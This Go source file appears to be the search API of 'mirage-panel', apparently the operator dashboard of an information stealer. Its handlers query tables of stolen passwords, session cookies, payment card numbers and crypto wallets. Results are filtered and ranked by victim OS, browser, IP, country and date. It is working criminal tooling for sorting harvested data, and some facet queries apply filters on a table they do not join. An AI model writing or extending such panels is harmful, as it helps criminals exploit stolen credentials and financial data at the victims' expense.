package api

import (
	"database/sql"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/user/mirage-panel/internal/services"
)

type SearchHandler struct {
	db      *sql.DB
	logProc *services.LogProcessor
}

func NewSearchHandler(db *sql.DB) *SearchHandler {
	return &SearchHandler{db: db}
}

type searchResult struct {
	SessionID string `json:"session_id"`
	Type      string `json:"type"`
	Value     string `json:"value"`
	Context   string `json:"context"`
	CreatedAt string `json:"created_at"`
}

type Facets struct {
	Browsers map[string]int `json:"browsers"`
	OS       map[string]int `json:"os"`
	Domains  map[string]int `json:"domains"`
}

func (h *SearchHandler) Search(w http.ResponseWriter, r *http.Request) {
	q := strings.TrimSpace(r.URL.Query().Get("q"))
	if q == "" || len(q) < 2 {
		writeJSON(w, http.StatusOK, map[string]any{"results": []searchResult{}, "total": 0})
		return
	}

	typ := r.URL.Query().Get("type")
	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
	if page < 1 {
		page = 1
	}
	perPage, _ := strconv.Atoi(r.URL.Query().Get("per_page"))
	if perPage < 1 || perPage > 100 {
		perPage = 50
	}

	like := "%" + q + "%"
	offset := (page - 1) * perPage

	type queryDef struct {
		name  string
		query string
		count string
	}

	queries := []queryDef{
		{"password", "SELECT p.session_id, 'password', p.url, p.username, s.created_at FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?",
			"SELECT COUNT(*) FROM passwords WHERE url LIKE ? OR username LIKE ? OR password_value LIKE ?"},
		{"cookie", "SELECT c.session_id, 'cookie', c.name, c.domain, s.created_at FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE c.name LIKE ? OR c.domain LIKE ? OR c.value LIKE ?",
			"SELECT COUNT(*) FROM cookies WHERE name LIKE ? OR domain LIKE ? OR value LIKE ?"},
		{"card", "SELECT c.session_id, 'card', c.holder, c.number, s.created_at FROM cards c JOIN sessions s ON s.id = c.session_id WHERE c.holder LIKE ? OR c.number LIKE ?",
			"SELECT COUNT(*) FROM cards WHERE holder LIKE ? OR number LIKE ?"},
		{"wallet", "SELECT w.session_id, 'wallet', w.name, w.path, s.created_at FROM wallets w JOIN sessions s ON s.id = w.session_id WHERE w.name LIKE ?",
			"SELECT COUNT(*) FROM wallets WHERE name LIKE ?"},
	}

	switch typ {
	case "passwords":
		typ = "password"
	case "cookies":
		typ = "cookie"
	case "cards":
		typ = "card"
	case "wallets":
		typ = "wallet"
	}

	if typ == "password" || typ == "cookie" || typ == "card" || typ == "wallet" {
		queries = []queryDef{queries[map[string]int{"password": 0, "cookie": 1, "card": 2, "wallet": 3}[typ]]}
	}

	var allResults = make([]searchResult, 0)
	var total int

	for _, qd := range queries {
		if typ == "" || typ == qd.name {
			var queryArgs []any
			switch qd.name {
			case "password", "cookie":
				queryArgs = []any{like, like, like}
			case "card":
				queryArgs = []any{like, like}
			case "wallet":
				queryArgs = []any{like}
			}
			var subTotal int
			h.db.QueryRow(qd.count, queryArgs...).Scan(&subTotal)
			total += subTotal

			if subTotal > 0 {
				qargs := append(queryArgs, perPage, offset)
				rows, err := h.db.Query(qd.query+" ORDER BY s.created_at DESC LIMIT ? OFFSET ?", qargs...)
				if err != nil {
					continue
				}
				for rows.Next() {
					var r searchResult
					if rows.Scan(&r.SessionID, &r.Type, &r.Value, &r.Context, &r.CreatedAt) == nil {
						allResults = append(allResults, r)
					}
				}
				rows.Close()
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"results": allResults,
		"total":   total,
		"page":    page,
		"perPage": perPage,
	})
}

func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
	q := strings.TrimSpace(r.URL.Query().Get("q"))
	osFilter := r.URL.Query().Get("os")
	browserFilter := r.URL.Query().Get("browser")
	dateFrom := r.URL.Query().Get("date_from")
	dateTo := r.URL.Query().Get("date_to")

	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
	if page < 1 {
		page = 1
	}
	perPage, _ := strconv.Atoi(r.URL.Query().Get("per_page"))
	if perPage < 1 || perPage > 100 {
		perPage = 50
	}

	var conditions []string
	var args []any

	if q != "" {
		like := "%" + q + "%"
		conditions = append(conditions, "(p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)")
		args = append(args, like, like, like)
	}
	if osFilter != "" {
		conditions = append(conditions, "s.os = ?")
		args = append(args, osFilter)
	}
	if browserFilter != "" {
		conditions = append(conditions, "p.browser = ?")
		args = append(args, browserFilter)
	}
	if dateFrom != "" {
		conditions = append(conditions, "s.created_at >= ?")
		args = append(args, dateFrom)
	}
	if dateTo != "" {
		conditions = append(conditions, "s.created_at <= ?")
		args = append(args, dateTo+" 23:59:59")
	}

	sessionWhere := ""
	if len(conditions) > 0 {
		sessionWhere = " AND " + strings.Join(conditions, " AND ")
	}

	countQuery := "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1" + sessionWhere
	var total int
	h.db.QueryRow(countQuery, args...).Scan(&total)

	offset := (page - 1) * perPage
	dataQuery := fmt.Sprintf(`SELECT p.session_id, p.url, p.username, p.password_value, p.browser, s.os, s.ip, s.country_code, s.created_at
		FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1%s ORDER BY s.created_at DESC LIMIT ? OFFSET ?`, sessionWhere)
	qargs := append(args, perPage, offset)

	rows, err := h.db.Query(dataQuery, qargs...)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "search failed")
		return
	}
	defer rows.Close()

	type advancedResult struct {
		SessionID   string `json:"session_id"`
		URL         string `json:"url"`
		Username    string `json:"username"`
		Password    string `json:"password"`
		Browser     string `json:"browser"`
		OS          string `json:"os"`
		IP          string `json:"ip"`
		CountryCode string `json:"country_code"`
		CreatedAt   string `json:"created_at"`
	}

	results := make([]advancedResult, 0)
	for rows.Next() {
		var r advancedResult
		if rows.Scan(&r.SessionID, &r.URL, &r.Username, &r.Password, &r.Browser, &r.OS, &r.IP, &r.CountryCode, &r.CreatedAt) == nil {
			results = append(results, r)
		}
	}

	pages := (total + perPage - 1) / perPage

	facets := h.buildAdvancedFacets(sessionWhere, args)

	writeJSON(w, http.StatusOK, map[string]any{
		"results":  results,
		"total":    total,
		"page":     page,
		"per_page": perPage,
		"pages":    pages,
		"facets":   facets,
	})
}

func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []any) Facets {
	facets := Facets{
		Browsers: make(map[string]int),
		OS:       make(map[string]int),
		Domains:  make(map[string]int),
	}

	whereClause := ""
	if sessionWhere != "" {
		whereClause = " WHERE 1=1 " + sessionWhere
	}

	rows, err := h.db.Query("SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+whereClause+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", sessionArgs...)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var name string
			var cnt int
			if rows.Scan(&name, &cnt) == nil && name != "" {
				facets.Browsers[name] = cnt
			}
		}
	}

	rows2, err := h.db.Query("SELECT s.os, COUNT(*) as cnt FROM sessions s"+whereClause+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
	if err == nil {
		defer rows2.Close()
		for rows2.Next() {
			var name string
			var cnt int
			if rows2.Scan(&name, &cnt) == nil && name != "" {
				facets.OS[name] = cnt
			}
		}
	}

	rows3, err := h.db.Query("SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+whereClause+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
	if err == nil {
		defer rows3.Close()
		for rows3.Next() {
			var name string
			var cnt int
			if rows3.Scan(&name, &cnt) == nil && name != "" {
				facets.Domains[name] = cnt
			}
		}
	}

	return facets
}
